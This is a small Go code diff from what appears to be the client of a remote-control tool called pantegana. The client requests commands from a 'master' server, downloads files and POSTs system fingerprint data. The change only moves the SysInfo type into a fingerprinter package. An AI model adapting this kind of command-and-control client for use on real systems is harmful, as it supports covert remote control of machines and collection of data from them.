@@ -14,6 +14,8 @@ import (
 	"path/filepath"
 	"strings"
 	"time"
+
+	"github.com/elleven11/pantegana/client/fingerprinter"
 )
 
 // RequestCommand sends a HTTPS GET request to the master pantegana server
@@ -166,7 +168,7 @@ func (c *Client) DownloadFile(url string, filePath string) {
 	log.Println("[+] Successfully downloaded file")
 }
 
-func (c *Client) SendSysInfo(url string, sysInfo SysInfo) {
+func (c *Client) SendSysInfo(url string, sysInfo fingerprinter.SysInfo) {
 	data, _ := json.Marshal(sysInfo)
 	req, err := http.NewRequest("POST", url, bytes.NewBuffer(data))
 	if err != nil {
